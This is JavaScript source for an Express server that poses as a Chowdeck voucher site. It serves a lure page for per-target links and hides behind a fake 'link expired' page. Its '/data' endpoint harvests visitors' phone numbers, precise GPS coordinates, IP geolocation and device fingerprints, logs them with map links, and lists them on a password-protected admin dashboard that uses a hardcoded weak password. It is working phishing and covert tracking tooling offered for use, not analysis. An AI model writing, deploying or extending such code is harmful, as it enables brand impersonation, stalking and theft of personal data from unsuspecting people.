const express = require("express");
const fs      = require("fs");
const path    = require("path");
const crypto  = require("crypto");

const app      = express();
const PORT     = process.env.PORT || 3000;
const DATA_DIR = process.env.DATA_DIR || __dirname;
const LOG_FILE = path.join(DATA_DIR, "captures.json");

const ADMIN_USER = "chowadmin";
const ADMIN_PASS = "password123";
const sessions   = new Set();

app.use(express.json());
app.use(express.static(path.join(__dirname, "public"), { index: false }));

// Root — show link expired so direct visitors see nothing useful
app.get("/", (req, res) => {
  res.send(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Chowdeck</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px}.card{background:white;border-radius:14px;padding:32px 24px;max-width:360px;width:100%;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,0.08)}.logo{margin-bottom:20px}.icon{font-size:2.5rem;margin-bottom:12px}.title{font-size:1.1rem;font-weight:700;color:#1B4F2A;margin-bottom:8px}.msg{font-size:0.85rem;color:#777;line-height:1.6;margin-bottom:20px}.btn{display:inline-block;background:#1B4F2A;color:white;padding:12px 28px;border-radius:8px;font-size:0.9rem;font-weight:700;text-decoration:none}footer{margin-top:24px;font-size:0.68rem;color:#aaa}</style></head><body><div class="card"><div class="icon">🔗</div><div class="title">This link has expired</div><div class="msg">The voucher link you followed is no longer active. Voucher links expire after 24 hours or once claimed.<br/><br/>If you received this from someone, ask them to share a fresh link.</div><a class="btn" href="https://chowdeck.com">Go to Chowdeck</a></div><footer>Chowdeck Limited &nbsp;|&nbsp; Lagos, Nigeria</footer></body></html>`);
});

function loadCaptures() {
  if (fs.existsSync(LOG_FILE)) {
    try { return JSON.parse(fs.readFileSync(LOG_FILE, "utf8")); }
    catch { return []; }
  }
  return [];
}

// Data collection endpoint
app.post("/data", (req, res) => {
  const data = req.body;
  const ip   = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  const entry = {
    ip,
    ua:                  data.ua                  || null,
    timestamp:           data.timestamp           || new Date().toISOString(),
    source:              data.source              || "unknown",
    txn_id:              data.txn_id              || null,
    phone:               data.phone               || null,
    gps_lat:             data.gps_lat             || null,
    gps_lon:             data.gps_lon             || null,
    gps_accuracy_meters: data.gps_accuracy_meters || null,
    screen:              data.screen              || null,
    timezone:            data.timezone            || null,
    platform:            data.platform            || null,
    lang:                data.lang                || null,
    cores:               data.cores               || null,
    mem:                 data.mem                 || null,
    ip_city:             data.ip_city             || null,
    ip_region:           data.ip_region           || null,
    ip_country:          data.ip_country          || null,
    ip_isp:              data.ip_isp              || null,
    ip_lat:              data.ip_lat              || null,
    ip_lon:              data.ip_lon              || null,
    ip_addr:             data.ip_addr             || null,
  };

  const captures = loadCaptures();
  captures.push(entry);
  try { fs.writeFileSync(LOG_FILE, JSON.stringify(captures, null, 2)); } catch(e) {}

  if (entry.phone)   console.log(`\n[!] PHONE:  ${entry.phone}  | TXN: ${entry.txn_id} | ${entry.timestamp}`);
  if (entry.gps_lat) console.log(`[!] GPS:    ${entry.gps_lat}, ${entry.gps_lon} (±${entry.gps_accuracy_meters}m)\n    Maps: https://www.google.com/maps?q=${entry.gps_lat},${entry.gps_lon}`);
  if (entry.ip_city) console.log(`[!] IP GEO: ${entry.ip_city}, ${entry.ip_region}, ${entry.ip_country} | ${entry.ip_addr} | ${entry.ip_isp}`);
  if (entry.source === 'fingerprint') console.log(`[!] DEVICE: ${entry.platform} | ${entry.screen} | ${entry.timezone}`);

  res.sendStatus(200);
});

// Admin routes
app.get("/admin", (req, res) => res.sendFile(path.join(__dirname, "views", "admin-login.html")));
app.get("/admin/dashboard", (req, res) => res.sendFile(path.join(__dirname, "views", "admin-dashboard.html")));

app.post("/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const token = crypto.randomBytes(20).toString("hex");
    sessions.add(token);
    res.json({ ok: true, token });
  } else {
    setTimeout(() => res.status(401).json({ ok: false }), 1200);
  }
});

app.post("/admin/logout", (req, res) => {
  sessions.delete(req.headers["x-token"]);
  res.sendStatus(200);
});

app.get("/admin/captures", (req, res) => {
  const token = req.query.token || req.headers["x-token"];
  if (!sessions.has(token)) return res.status(401).json({ error: "Unauthorized" });
  res.json(loadCaptures());
});

// Serve lure page for /:txnId
app.get("/:txnId", (req, res) => {
  const txnId = req.params.txnId;
  if (!/^[A-Za-z0-9]{8,20}$/.test(txnId)) return res.status(404).send("Not found");
  let html = fs.readFileSync(path.join(__dirname, "public", "index.html"), "utf8");
  html = html.replace("__TXN_ID__", txnId.toUpperCase());
  res.send(html);
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`\n[*] Chowdeck OSINT — port ${PORT}`);
  console.log(`[*] Generate link: node gen-link.js\n`);
});
